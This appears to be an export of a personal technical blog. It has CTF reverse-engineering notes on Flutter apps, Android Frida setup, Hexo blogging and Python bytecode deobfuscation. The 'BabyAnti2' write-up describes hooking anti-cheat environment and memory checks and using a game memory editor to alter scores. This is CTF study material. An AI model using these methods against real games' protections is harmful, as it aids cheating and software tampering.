<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r0 -  r1 |     | Returns</span><br><span class="line">r0 -  r9 |     | General purpose</span><br><span class="line">r4 - r10 |     | Callee saved registers</span><br><span class="line">      r5 | pp  | Object pool</span><br><span class="line">     r10 | thr | Current thread</span><br><span class="line">     r11 | fp  | Frame pointer</span><br><span class="line">     r12 | ip  | Scratch register</span><br><span class="line">     r13 | sp  | Stack pointer</span><br><span class="line">     r14 | lr  | Link register</span><br><span class="line">     r15 | pc  | Program counter</span><br></pre></td></tr></table></figure>
<h5 id="example"><a class="markdownIt-Anchor" href="#example">#</a> example：</h5>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> hello() &#123;</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Code for optimized function &#x27;package:dectest/hello_world.dart_::_hello&#x27; &#123;</span><br><span class="line">        ;; B0</span><br><span class="line">        ;; B1</span><br><span class="line">        ;; Enter frame（保存当前函数帧指针和返回地址）</span><br><span class="line">0xf69ace60    e92d4800               stmdb sp!, &#123;fp, lr&#125;;stmdb sp!存储数据前递减寄存器(Store Multiple Decrement Before)</span><br><span class="line">0xf69ace64    e28db000               add fp, sp, #0</span><br><span class="line">        ;; CheckStackOverflow:8(stack=0, loop=0)将字段偏移表（限制个数为36）加载到ip中并检测栈溢出</span><br><span class="line">0xf69ace68    e59ac024               ldr ip, [thr, #+36]</span><br><span class="line">0xf69ace6c    e15d000c               cmp sp, ip</span><br><span class="line">0xf69ace70    9bfffffe               blls +0 ; 0xf69ace70</span><br><span class="line">        ;; PushArgument(v3)</span><br><span class="line">0xf69ace74    e285ca01               add ip, pp, #4096</span><br><span class="line">0xf69ace78    e59ccfa7               ldr ip, [ip, #+4007]</span><br><span class="line">0xf69ace7c    e52dc004               str ip, [sp, #-4]!</span><br><span class="line">        ;; StaticCall:12( print&lt;0&gt; v3)</span><br><span class="line">0xf69ace80    ebfffffe               bl +0 ; 0xf69ace80</span><br><span class="line">0xf69ace84    e28dd004               add sp, sp, #4</span><br><span class="line">        ;; ParallelMove r0 &lt;- C</span><br><span class="line">0xf69ace88    e59a0060               ldr r0, [thr, #+96]</span><br><span class="line">        ;; Return:16(v0)</span><br><span class="line">0xf69ace8c    e24bd000               sub sp, fp, #0</span><br><span class="line">0xf69ace90    e8bd8800               ldmia sp!, &#123;fp, pc&#125;</span><br><span class="line">0xf69ace94    e1200070               bkpt #0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="another-example"><a class="markdownIt-Anchor" href="#another-example">#</a> another example:</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// prologue, polymorphic entry</span><br><span class="line">000 | stmdb sp!, &#123;fp, lr&#125;</span><br><span class="line">004 | add fp, sp, #0</span><br><span class="line">008 | sub sp, sp, #4</span><br><span class="line">// optional parameter handling</span><br><span class="line">00c | ldr r0, [r4, #0x13] // arr[2] (positional arg count)</span><br><span class="line">010 | ldr r1, [r4, #0xf]  // arr[1] (argument count)</span><br><span class="line">014 | cmp r0, #0          // check if we have positional args</span><br><span class="line">018 | bgt 0x74            // jump to 08c</span><br><span class="line">// check named args</span><br><span class="line">01c | ldr r0, [r4, #0x17]  // arr[3] (first arg name)</span><br><span class="line">020 | add ip, pp, #0x2000  // </span><br><span class="line">024 | ldr ip, [ip, #0x4a7] // string &quot;x&quot;</span><br><span class="line">028 | cmp r0, ip           // check if arg present</span><br><span class="line">02c | bne 0x20             // jump to 04c</span><br><span class="line">030 | ldr r0, [r4, #0x1b]    // arr[4] (first arg position)</span><br><span class="line">034 | sub r2, r1, r0         // r2 = arg_count - position</span><br><span class="line">038 | add r0, fp, r2, lsl #1 // r0 = fp + r2 * 2</span><br><span class="line">    |                        // this is really r2 * 4 because it&#x27;s an smi</span><br><span class="line">03c | ldr r0, [r0, #4]       // read arg</span><br><span class="line">040 | mov r2, r0             // </span><br><span class="line">044 | mov r0, #2             // </span><br><span class="line">048 | b 12                   // jump to 054</span><br><span class="line">04c | ldr r2, [thr, #0x68] // thr-&gt;objectNull</span><br><span class="line">050 | mov r0, #0           // </span><br><span class="line">054 | str r2, [fp, #-4] // store arg in local</span><br><span class="line">// done loading args</span><br><span class="line">058 | cmp r1, r0 // check if we have read all args</span><br><span class="line">05c | bne 0x30   // jump to 08c</span><br><span class="line">// continue prologe</span><br><span class="line">060 | ldr ip, [thr, #0x24] // thr-&gt;stackLimit</span><br><span class="line">064 | cmp sp, ip           //</span><br><span class="line">068 | blls -0x5af00        // stackOverflowStubWithoutFpuRegsStub</span><br><span class="line">// rest of function</span><br><span class="line">06c | ...</span><br><span class="line">// incompatible args path</span><br><span class="line">08c | ldr r6, [pp, #0x33] // Code* callClosureNoSuchMethod</span><br><span class="line">090 | sub sp, fp, #0      // </span><br><span class="line">094 | ldmia sp!, &#123;fp, lr&#125; // exit frame</span><br><span class="line">098 | ldr pc, [r6, #3]    // invoke stub</span><br></pre></td></tr></table></figure>
<p>一些普遍做题思路：先 reflutter 然后对着 dump 出来的 offset 进行 hook / 恢复符号表</p>
<p><s>大概流程懂了，等个环境先</s></p>
<p>ARM 交叉编译工具链 (32 位)： <code>sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi</code>  (64 位)： <code>sudo apt-get install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu</code></p>
<p>寻找 <code>SVC</code>  指令出现的地址： <code>aarch64-linux-gnu-objdump -D libapp.so | grep -B2 -A2 --color=always &quot;svc&quot;</code></p>
<hr>
<h6 id="leaves大哥带着在看这个babyanti2比赛的时候被他高速非预期了但是现在复盘感觉预期解难度有点离谱的"><a class="markdownIt-Anchor" href="#leaves大哥带着在看这个babyanti2比赛的时候被他高速非预期了但是现在复盘感觉预期解难度有点离谱的">#</a> leaves 大哥带着在看这个 babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的</h6>
<h5 id="目前还没有完整复现但是大概记录一下"><a class="markdownIt-Anchor" href="#目前还没有完整复现但是大概记录一下">#</a> 目前还没有完整复现，但是大概记录一下：</h5>
<ul>
<li>
<p>最简单的先把 anti 里面的环境检测 hook 掉</p>
</li>
<li>
<p>然后合理就去 gg 修改分数，但是发现有疑似内存检查</p>
</li>
<li>
<p>flutter 的 libapp.so 恢复符号表（基本上就是我上面说的方法）发现有对内存进行的操作，进行 hook</p>
</li>
<li>
<p>然后不够，libapp.so 里面有一个 <code>generateShellcodes</code> ，非常复杂；可以 hook  <code>mprotect</code> ，发现有一个传入 0x7（可读、写、执行）的调用，比较异常，对其操作的 0x1000 长度的地址 dump 下来分析，发现好几十个 SVC 调用</p>
</li>
<li>
<p>后续： 结论是两层 shellcode 调用 mincore，检查是否有内存缺页更改的操作，确实难</p>
</li>
</ul>
<hr>
<h6 id="914-babyanti2完整复现"><a class="markdownIt-Anchor" href="#914-babyanti2完整复现">#</a> 9.14: BabyAnti2 完整复现：</h6>
<p>AntiCheatPlugin 的 Java 层几乎看不到东西，只能判断使用 flutter，那么必须继续看下去，找 dart 层和 native 层的逻辑</p>
<p><img loading="lazy" data-src="%E5%88%9D%E6%8E%A2flutter/image-20230914083329468.png" alt="image-20230914083329468"></p>
<p>直接看 native：</p>
<p><img loading="lazy" data-src="%E5%88%9D%E6%8E%A2flutter/image-20230914083721077.png" alt="image-20230914083721077"></p>
<p><code>libflutter.so</code> ：flutter 预编译的组件库（不会因为开发者的 Dart 而改变），flutter 引擎的主要组成部分，包含了 flutter 运行所需要的核心代码，负责渲染 Flutter widgets、处理事件、与 Dart VM 进行交互以及其他核心功能</p>
<p><code>libapp.so</code> ：Dart 代码编译后的产物，包含所有 Dart 层的 native 逻辑、UI、Flutter plugins，当应用启动时， <code>libflutter.so</code>  会加载 <code>libapp.so</code>  并开始执行 Dart 代码</p>
<p><code>libanticheat.so（其他）</code> ：通过 Android NDK 编写的 native 代码编译产物</p>
<p>尝试通过<a href="https://github.com/rscloura/Doldrums"> rscloura/Doldrums: A Flutter/Dart reverse engineering tool (github.com)</a><a href="http://xn--libapp-op2ju0ndo1a5qn.so"> 工具提取 libapp.so</a>，失败，DartSDK 版本对不上</p>
<p><img loading="lazy" data-src="%E5%88%9D%E6%8E%A2flutter/image-20230914094329393.png" alt="image-20230914094329393"></p>
<p>寻找版本相关信息，可以得到这段，获取版本号 3.1.0（这里可以猜测这个是 dart 的版本）对应到<a href="https://docs.flutter.dev/release/archive?tab=windows"> Flutter SDK archive | Flutter</a> 可以查找 flutter 的版本号 beta 版本的 3.13.0-0.4.pre（根据发布时间和 Dart version，不过 hash 号没有找到，还得看看）</p>
<p><img loading="lazy" data-src="%E5%88%9D%E6%8E%A2flutter/image-20230914103350070.png" alt="image-20230914103350070"></p>
<p>题目出的时候 <code>reflutter</code>  还没有更新到这个版本，可以认为，在比赛环境下这让做这道题的预期解难度陡然升高</p>
<p>那也只能开始漫长学习，先看看这篇的原理：<a href="https://swarm.ptsecurity.com/fork-bomb-for-flutter/">Fork Bomb for Flutter – PT SWARM (ptsecurity.com)</a></p>
<p>安装应用： <code>adb push .apk /data/local/tmp </code></p>
<p><code>pm install -r .apk</code></p>
<p>签名工具：<a href="https://github.com/patrickfav/uber-apk-signer/releases/tag/v1.2.1">Release v1.2.1 · patrickfav/uber-apk-signer (github.com)</a></p>
<p><code>java -jar uber-apk-signer.jar --allowResign -**a** release.RE.apk</code></p>
<p><code> adb logcat -e reflutter | ForEach-Object &#123; $_ -replace '.*DartVM', '' &#125; &gt;&gt; reflutter.txt</code></p>
]]></content>
  </entry>
  <entry>
    <title>to build your blog on github</title>
    <url>/2022/08/26/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="build-blog-with-hexo-and-github-pages"><a class="markdownIt-Anchor" href="#build-blog-with-hexo-and-github-pages">#</a> Build Blog with Hexo and GitHub Pages</h1>
<h5 id="published-20220826"><a class="markdownIt-Anchor" href="#published-20220826">#</a> Published: 2022/08/26</h5>
<h5 id="updated-20220826"><a class="markdownIt-Anchor" href="#updated-20220826">#</a> Updated: 2022/08/26</h5>
<h2 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE</h2>
<h6 id="as-my-very-first-blog-here-i-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog"><a class="markdownIt-Anchor" href="#as-my-very-first-blog-here-i-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog">#</a> As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog.</h6>
<h6 id="the-things-need-to-be-done"><a class="markdownIt-Anchor" href="#the-things-need-to-be-done">#</a> THE THINGS NEED TO BE DONE</h6>
<span id="more"></span>
<hr>
<blockquote>
<p>hexo</p>
<blockquote>
<p>Hexo is a blog framework based on Node.js. We can maintain a Hexo instance on local machine, and publish it to Github pages.</p>
</blockquote>
</blockquote>
<blockquote>
<p>node.js</p>
<blockquote>
<p>an free open source server environment which can be ran on Windows, Linux, Unix, Mac OS X, ect.</p>
</blockquote>
</blockquote>
<blockquote>
<p>set up the github account</p>
<blockquote>
<p>GitHub Pages is a static site hosting service designed to host your personal, organization or project pages directly from a GitHub repository</p>
</blockquote>
</blockquote>
<h3 id="nodejs"><a class="markdownIt-Anchor" href="#nodejs">#</a> Node.js</h3>
<p>Go to <a href="https://nodejs.org/en/download/">Download - Node.js</a>, choose and install the right version for your computer.</p>
<p>Run  <code>node -v</code>  then  <code>npm -v</code>  on cmd, check your Node.js version if it doesn’t output two version of node and npm.</p>
<h3 id="git"><a class="markdownIt-Anchor" href="#git">#</a> git</h3>
<p>Go to <a href="https://git-scm.com/downloads">Download - git</a>, leave the options default if you don’t understand.</p>
<p>When you are done, use cmd to chack if you do it right by run</p>
<blockquote>
<p><code>git --version</code> <br>
If it outputs your git version, you do it right.</p>
</blockquote>
<p>run</p>
<p><code>git config --global user.name &quot;Your Name&quot;</code> <br>
 <code>git config --global user.email youremail@example.com</code> <br>
 <code> ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code></p>
<p>and you will get two files(your own screen name and your email)</p>
<h3 id="hexo"><a class="markdownIt-Anchor" href="#hexo">#</a> Hexo</h3>
<p>Run  <code>npm install hexo-cli -g</code>  on a folder you would like to</p>
<p>Run  <code>hexo init</code>  and  <code>npm install</code>  on THE FOLDER YOU WANT TO PUT YOUR BLOG IN, run  <code>hexo version</code> ( <code>hexo -v</code> ) to verify Hexo.</p>
<p>run  <code>hexo g</code>  then  <code>hexo s</code>   <code>(hexo server)</code>  and visit <a href="http://localhost:4000">your blog</a> (<a href="http://localhost:4000">http://localhost:4000</a>, the default port is 4000, if it reports error, try to run  <code>hexo s -i</code> , i stands for the port that isn’t occupied)</p>
<p>find  <code>_config.yml</code> , find  <code>deploy:</code> ,part and edit:</p>
<p><code>deploy:</code> <br>
 <code>type: git</code> <br>
 <code>repo: git@github.com:yourname/yourname.github.io.git</code> <br>
 <code>branch: master</code></p>
<p>Create a GitHub Repository</p>
<h4 id="tips"><a class="markdownIt-Anchor" href="#tips">#</a> TIPS:</h4>
<p>Change your GitHub Branch from “main” to “Master”</p>
<p>Find a file end with “id_rsa.pub” which generated when you install git and get the ssh key above. Copy it and paste it into your GitHub Repository ssh key</p>
<p>run  <code>npm install hexo-deployer-git --save</code></p>
<p>Now, run  <code>hexo d -g</code>  and visit your GitHub wesite (which you can find in your repository SETTING), you should see your blog above.</p>
]]></content>
      <tags>
        <tag>tools</tag>
        <tag>hexo</tag>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓hook初探</title>
    <url>/2023/08/28/%E5%AE%89%E5%8D%93hook%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-隐约记得之前弄过一次但是这次换了个环境折腾了一整天吧还挺麻烦的总之记录一下后面搞起来方便"><a class="markdownIt-Anchor" href="#preface-隐约记得之前弄过一次但是这次换了个环境折腾了一整天吧还挺麻烦的总之记录一下后面搞起来方便">#</a> preface: 隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便.</h6>
<span id="more"></span>
<hr>
<h5 id="环境mumu12模拟器"><a class="markdownIt-Anchor" href="#环境mumu12模拟器">#</a> 环境：mumu12 模拟器</h5>
<h6 id="adb连接"><a class="markdownIt-Anchor" href="#adb连接">#</a> adb 连接：</h6>
<p><img loading="lazy" data-src="%E5%AE%89%E5%8D%93hook%E5%88%9D%E6%8E%A2/image-20230828105143258.png" alt="image-20230828105143258"></p>
<h5 id="连接adbexe-connect-127001-断开adbexe-disconnect-127001"><a class="markdownIt-Anchor" href="#连接adbexe-connect-127001-断开adbexe-disconnect-127001">#</a> 连接： <code>adb.exe connect 127.0.0.1:*****</code>   断开： <code>adb.exe disconnect 127.0.0.1:*****</code></h5>
<h5 id="检查设备adbexe-devices"><a class="markdownIt-Anchor" href="#检查设备adbexe-devices">#</a> 检查设备： <code>adb.exe devices</code></h5>
<h5 id="shell-adb-s-127001-shell-或-adb-shell"><a class="markdownIt-Anchor" href="#shell-adb-s-127001-shell-或-adb-shell">#</a> shell:  <code>adb -s 127.0.0.1:***** shell</code>  或  <code>adb shell</code></h5>
<hr>
<h5 id="查看手机cpu架构-getprop-roproductcpuabi"><a class="markdownIt-Anchor" href="#查看手机cpu架构-getprop-roproductcpuabi">#</a> 查看手机 CPU 架构 ：  <code>getprop ro.product.cpu.abi</code></h5>
<h5 id="找到对应frida-server-frida-version检查本机frida版本releases-fridafrida-githubcom"><a class="markdownIt-Anchor" href="#找到对应frida-server-frida-version检查本机frida版本releases-fridafrida-githubcom">#</a> 找到对应 frida server：  <code>frida version</code>  检查本机 frida 版本<a href="https://github.com/frida/frida/releases"> Releases・frida/frida (github.com)</a></h5>
<h5 id="运行frida-server-adb-push-frida-server-datalocaltmp"><a class="markdownIt-Anchor" href="#运行frida-server-adb-push-frida-server-datalocaltmp">#</a> 运行 frida server:  <code>adb push frida-server /data/local/tmp/</code></h5>
<h5 id="cd-datalocaltmp"><a class="markdownIt-Anchor" href="#cd-datalocaltmp">#</a>  <code>cd /data/local/tmp</code></h5>
<h5 id="frida-server"><a class="markdownIt-Anchor" href="#frida-server">#</a>  <code>./frida-server</code></h5>
<h5 id="电脑查看手机正在运行的进程firda-ps-u"><a class="markdownIt-Anchor" href="#电脑查看手机正在运行的进程firda-ps-u">#</a> 电脑查看手机正在运行的进程： <code>firda-ps -U</code></h5>
<h5 id="端口转发-adb-forward-tcp27042-tcp27042"><a class="markdownIt-Anchor" href="#端口转发-adb-forward-tcp27042-tcp27042">#</a> 端口转发:  <code>adb forward tcp:27042 tcp:27042</code></h5>
<h5 id="查看包名"><a class="markdownIt-Anchor" href="#查看包名">#</a> 查看包名：</h5>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#查看进程中的信息</span><br><span class="line">#process = frida.get_usb_device().enumerate_processes()</span><br><span class="line">#print(process)</span><br><span class="line"></span><br><span class="line">1.新开一个shell输入命令：</span><br><span class="line">adb shell am monitor</span><br><span class="line">2.启动需要获取包名的应用</span><br></pre></td></tr></table></figure>
<hr>
<h5 id="运行frida脚本frida-u-l-your-scriptjs-f-comyourapppackage"><a class="markdownIt-Anchor" href="#运行frida脚本frida-u-l-your-scriptjs-f-comyourapppackage">#</a> 运行 frida 脚本: <code>frida -U -l your-script.js -f com.yourapp.package</code></h5>
<h5 id="frida检查包名adb-shell-pm-list-packages-grep"><a class="markdownIt-Anchor" href="#frida检查包名adb-shell-pm-list-packages-grep">#</a> frida 检查包名： <code>adb shell pm list packages | grep ***</code></h5>
<hr>
<h5 id="gg修改器-httpsgameguardiannetforumfilesfile2-gameguardian"><a class="markdownIt-Anchor" href="#gg修改器-httpsgameguardiannetforumfilesfile2-gameguardian">#</a> gg 修改器:    <a href="https://gameguardian.net/forum/files/file/2-gameguardian/">https://gameguardian.net/forum/files/file/2-gameguardian/</a></h5>
]]></content>
  </entry>
  <entry>
    <title>初探驱动</title>
    <url>/2024/01/15/%E5%88%9D%E6%8E%A2%E9%A9%B1%E5%8A%A8/</url>
    <content><![CDATA[<h6 id="preface偷点资料入个门吧性质应该属于随便看看"><a class="markdownIt-Anchor" href="#preface偷点资料入个门吧性质应该属于随便看看">#</a> PREFACE：偷点资料入个门吧，性质应该属于随便看看</h6>
<span id="more"></span>
]]></content>
  </entry>
  <entry>
    <title>初探python bytecode</title>
    <url>/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/</url>
    <content><![CDATA[<h6 id="preface起因是wmctf的一道python题包括了修复python字节码花指令和虚拟机等考点-算是萌新初见python花花了一上午学习修了花指令反编译不了不过可以获得字节码理论上手动反汇编得到python码就没问题了-但实际上这里的字节码结构也有点问题顺便从学长那里听闻了一下下antlr这种东西-然后手动翻译的伪代码也错漏百出最后是学长写了脚本给他自动化修了得以告一段落-不过确实得回来补补python的编译结构功课了"><a class="markdownIt-Anchor" href="#preface起因是wmctf的一道python题包括了修复python字节码花指令和虚拟机等考点-算是萌新初见python花花了一上午学习修了花指令反编译不了不过可以获得字节码理论上手动反汇编得到python码就没问题了-但实际上这里的字节码结构也有点问题顺便从学长那里听闻了一下下antlr这种东西-然后手动翻译的伪代码也错漏百出最后是学长写了脚本给他自动化修了得以告一段落-不过确实得回来补补python的编译结构功课了">#</a> preface: 起因是 wmctf 的一道 python 题，包括了修复 python 字节码花指令和虚拟机等考点。算是萌新初见 python 花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到 python 码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下 antlr 这种东西。然后手动翻译的伪代码也错漏百出… 最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补 python 的编译结构功课了。</h6>
<span id="more"></span>
<h5 id="题目是39的不过在这里就可以直接搜其他版本的也一样cpython-39"><a class="markdownIt-Anchor" href="#题目是39的不过在这里就可以直接搜其他版本的也一样cpython-39">#</a> 题目是 3.9 的，不过在这里就可以直接搜其他版本的也一样<a href="https://github.com/python/cpython/blob/3.9/Objects/codeobject.c"> cpython 3.9</a></h5>
<h5 id="image-20230823153127421"><a class="markdownIt-Anchor" href="#image-20230823153127421">#</a> <img loading="lazy" data-src="%E5%88%9D%E6%8E%A2python-bytecode/image-20230823153127421.png" alt="image-20230823153127421"></h5>
<h5 id="这里的co_code是字节码的长度标识在patch时需要注意修复长度其他标志位也需要注意赛时就是co_lnotab对齐问题导致的无法反编译"><a class="markdownIt-Anchor" href="#这里的co_code是字节码的长度标识在patch时需要注意修复长度其他标志位也需要注意赛时就是co_lnotab对齐问题导致的无法反编译">#</a> 这里的 co_code 是字节码的长度标识，在 patch 时需要注意修复长度，其他标志位也需要注意（赛时就是 co_lnotab 对齐问题导致的无法反编译）</h5>
<p><img loading="lazy" data-src="%E5%88%9D%E6%8E%A2python-bytecode/image-20230823154536966.png" alt="image-20230823154536966"></p>
<h5 id="cpythonobjectslnotab_notestxt-at-39-pythoncpython-githubcom"><a class="markdownIt-Anchor" href="#cpythonobjectslnotab_notestxt-at-39-pythoncpython-githubcom">#</a> <a href="https://github.com/python/cpython/blob/3.9/Objects/lnotab_notes.txt">cpython/Objects/lnotab_notes.txt at 3.9 · python/cpython (github.com)</a> 可以参考文档</h5>
<h5 id="去花脚本r1mao那里偷来的"><a class="markdownIt-Anchor" href="#去花脚本r1mao那里偷来的">#</a> 去花脚本（R1mao 那里偷来的）：</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> RightBack</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">from</span> graphviz <span class="keyword">import</span> Digraph</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_funcs</span>(<span class="params">module</span>):</span><br><span class="line">    funcs = []</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(module):</span><br><span class="line">        obj = <span class="built_in">getattr</span>(module, name)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, types.FunctionType):</span><br><span class="line">           funcs.append(obj)</span><br><span class="line">    <span class="keyword">return</span> funcs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_extend_size</span>(<span class="params">code, offset</span>):</span><br><span class="line">    ptr = offset</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        op = code[ptr]</span><br><span class="line">        <span class="keyword">if</span> op != dis.EXTENDED_ARG:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ptr += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ptr - offset</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InstWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, prefix_insn : <span class="built_in">list</span>[dis.Instruction], main_insn : dis.Instruction</span>):</span><br><span class="line">        self.offset = main_insn.offset</span><br><span class="line">        self.prefix_insn = prefix_insn</span><br><span class="line">        self.main_insn = main_insn</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(prefix_insn) != <span class="number">0</span>:</span><br><span class="line">            self.offset = prefix_insn[<span class="number">0</span>].offset</span><br><span class="line">        self.preds = <span class="built_in">set</span>()</span><br><span class="line">        self.succs = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edge</span>(<span class="params">self, v1</span>):</span><br><span class="line">        v1.preds.add(self)</span><br><span class="line">        self.succs.add(v1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unlink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> self.preds:</span><br><span class="line">            n.succs.remove(self)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> self.succs:</span><br><span class="line">            n.preds.remove(self)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (<span class="built_in">len</span>(self.prefix_insn) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_asm</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(self.succs) &lt;= <span class="number">2</span></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">if</span> self.main_insn.opcode <span class="keyword">not</span> <span class="keyword">in</span> dis.hasjabs <span class="keyword">and</span> self.main_insn.opcode <span class="keyword">not</span> <span class="keyword">in</span> dis.hasjrel:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> self.prefix_insn:</span><br><span class="line">                result += [p.opcode, p.arg]</span><br><span class="line">            result += [self.main_insn.opcode]</span><br><span class="line">            <span class="keyword">if</span> self.main_insn.arg:</span><br><span class="line">                result.append(self.main_insn.arg)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        s = <span class="built_in">list</span>(self.succs)</span><br><span class="line">        ref_target = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> self.offset + self.size() != n.offset:</span><br><span class="line">                ref_target = n.offset</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        argval = ref_target</span><br><span class="line">        <span class="keyword">if</span> self.main_insn.opcode <span class="keyword">in</span> dis.hasjrel:</span><br><span class="line">            argval = ref_target - (self.offset + <span class="built_in">len</span>(self.prefix_insn) * <span class="number">2</span>) - <span class="number">2</span></span><br><span class="line">        byte_size = <span class="built_in">len</span>(self.prefix_insn) + <span class="number">1</span></span><br><span class="line">        argval &amp;= (<span class="number">2</span> ** (<span class="number">8</span> * byte_size)) - <span class="number">1</span></span><br><span class="line">        raw = <span class="built_in">int</span>.to_bytes(argval, byte_size, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.prefix_insn)):</span><br><span class="line">            result += [dis.opmap[<span class="string">&#x27;EXTENDED_ARG&#x27;</span>], raw[i]]</span><br><span class="line">        result += [self.main_insn.opcode, raw[<span class="built_in">len</span>(self.prefix_insn)]]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%04d %s\t(%s)&#x27;</span> % (self.offset, self.main_insn.opname, <span class="built_in">str</span>(self.main_insn.argval) <span class="keyword">if</span> self.main_insn.argval <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fix_invalid</span>(<span class="params">func</span>):</span><br><span class="line">    raw_code = func.__code__.co_code</span><br><span class="line">    insn_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> dis._get_instructions_bytes(raw_code):</span><br><span class="line">        insn_map[insn.offset] = insn</span><br><span class="line"></span><br><span class="line">    trace_result = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">trace_pc</span>(<span class="params">code, insn_map, offset</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> trace_result</span><br><span class="line">        <span class="keyword">assert</span> offset <span class="keyword">in</span> insn_map</span><br><span class="line">        </span><br><span class="line">        extend_size = get_extend_size(code, offset)</span><br><span class="line">        cur_size = extend_size + <span class="number">2</span></span><br><span class="line">        cur = insn_map[offset + extend_size]</span><br><span class="line">        <span class="keyword">if</span> offset <span class="keyword">not</span> <span class="keyword">in</span> trace_result.keys():</span><br><span class="line">            trace_result.update(&#123;offset : cur_size&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> cur.opname == <span class="string">&#x27;RETURN_VALUE&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> cur.opcode <span class="keyword">in</span> dis.hasjabs + dis.hasjrel:</span><br><span class="line">            jump_target = cur.argval</span><br><span class="line">            <span class="keyword">if</span> cur.opname == <span class="string">&#x27;JUMP_FORWARD&#x27;</span> <span class="keyword">or</span> cur.opname == <span class="string">&#x27;JUMP_ABSOLUTE&#x27;</span>:</span><br><span class="line">                trace_pc(code, insn_map, jump_target)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                trace_pc(code, insn_map, jump_target)</span><br><span class="line">                trace_pc(code, insn_map, offset + cur_size)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            trace_pc(code, insn_map, offset + cur_size)</span><br><span class="line"></span><br><span class="line">    trace_pc(raw_code, insn_map, <span class="number">0</span>)</span><br><span 